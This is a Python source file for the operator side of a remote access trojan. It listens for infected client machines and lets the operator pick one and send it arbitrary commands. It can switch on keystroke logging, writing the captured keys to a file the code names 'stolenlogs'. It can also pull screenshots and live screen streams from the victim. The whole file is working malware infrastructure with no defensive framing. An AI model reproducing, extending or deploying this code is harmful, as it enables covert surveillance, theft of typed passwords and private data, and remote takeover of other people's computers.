import socket
import threading
from PIL import Image
import io
import cv2
import numpy as np

# Read server IP and port from IPPORT.txt
with open("IPPORT.txt", "r") as f:
    SERVER_IPV6 = f.readline().strip()
    SERVER_IPV4 = f.readline().strip()
    PORT = int(f.readline().strip())

with open("keylogs.txt", "a") as logs:
    logs.write('\n')

keyrcv = threading.Event()
client_lock = threading.Lock()

def writelogs():
    while True:
        while keyrcv.is_set():
            with client_lock:
                if client:
                    data = client[0].recv(1024).decode()
                    with open("keylogs.txt", "a") as stolenlogs:
                        stolenlogs.write(str(data))

writelogs_thread = threading.Thread(target=writelogs)
writelogs_thread.start()

clients = []
last_command = None

def handle_stream(client):
    cv2.namedWindow("Stream", cv2.WINDOW_NORMAL)
    while True:
        try:
            length = client.recv(16).strip()
            if not length:
                break
            length = int(length.decode().strip())
            stringData = b''
            while len(stringData) < length:
                packet = client.recv(length - len(stringData))
                if not packet:
                    break
                stringData += packet
            data = np.frombuffer(stringData, dtype='uint8')
            decimg = cv2.imdecode(data, 1)
            if decimg is not None:
                cv2.imshow("Stream", decimg)
            if cv2.waitKey(1) == 27:  # Press 'Esc' to exit
                break
        except Exception as e:
            print(f"Stream error: {str(e)}")
            break
    cv2.destroyAllWindows()

def accept_clients(s):
    while True:
        client_socket, client_address = s.accept()
        clients.append((client_socket, client_address))
        print(f'[+] Client connected {client_address}')

def start_server():
    global s
    try:
        # Try IPv6 connection
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((SERVER_IPV6, PORT, 0, 0))
    except:
        # Fallback to IPv4 connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((SERVER_IPV4, PORT))
    s.listen(5)
    print(f'[*] Listening as {SERVER_IPV6 if s.family == socket.AF_INET6 else SERVER_IPV4}:{PORT}')

start_server()

accept_thread = threading.Thread(target=accept_clients, args=(s,))
accept_thread.start()

while True:
    while not clients:
        pass

    print("Available clients:")
    for i, (client_socket, client_address) in enumerate(clients):
        print(f"{i}: {client_address}")

    selected_client_index = int(input("Select a client to connect to: "))
    client = clients[selected_client_index]

    client[0].send('connected'.encode())
    try:
        while True:
            cmd = input('>>> ')
            client[0].send(cmd.encode())
            last_command = cmd.lower()

            if cmd.lower() in ['q', 'quit', 'x', 'exit']:
                break

            if cmd.lower() == 'k1':
                if not keyrcv.is_set():
                    keyrcv.set()
            elif cmd.lower() == 'k0':
                keyrcv.clear()

            # Handle screenshot command
            elif cmd.lower() == 'screenshot':
                file_info = client[0].recv(1024).decode()
                if '|' in file_info:
                    file_name, file_size_str = file_info.split('|', 1)
                    try:
                        file_size = int(file_size_str)
                        with open(file_name, 'wb') as f:
                            received_size = 0
                            while received_size < file_size:
                                data = client[0].recv(1024)
                                if not data:
                                    break
                                f.write(data)
                                received_size += len(data)
                        print(f'[+] Screenshot {file_name} received successfully. Size: {received_size} bytes')
                    except ValueError:
                        print(f'Error: Invalid file size in file info: {file_info}')
                        # Save the file with a default name if file size is invalid
                        with open("received_screenshot.png", 'wb') as f:
                            while True:
                                data = client[0].recv(1024)
                                if not data:
                                    break
                                f.write(data)
                        print(f'[+] Screenshot received with default name "received_screenshot.png".')
                else:
                    print(f'Error: Invalid file info received: {file_info}')
                    # Save the file with a default name if file info is invalid
                    with open("received_screenshot.png", 'wb') as f:
                        while True:
                            data = client[0].recv(1024)
                            if not data:
                                break
                            f.write(data)
                    print(f'[+] Screenshot received with default name "received_screenshot.png".')

            # Handle screen stream command
            elif cmd.lower() == 'stream':
                stream_thread = threading.Thread(target=handle_stream, args=(client[0],))
                stream_thread.start()
                stream_thread.join()
            else:
                try:
                    result = client[0].recv(8046)
                    if last_command not in ['screenshot', 'stream']:
                        print(result.decode())
                except UnicodeDecodeError:
                    pass
            
    except Exception as e:
        print(str(e))
    finally:
        client[0].close()
        clients.remove(client)

    cmd = input('Try reconnecting?') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()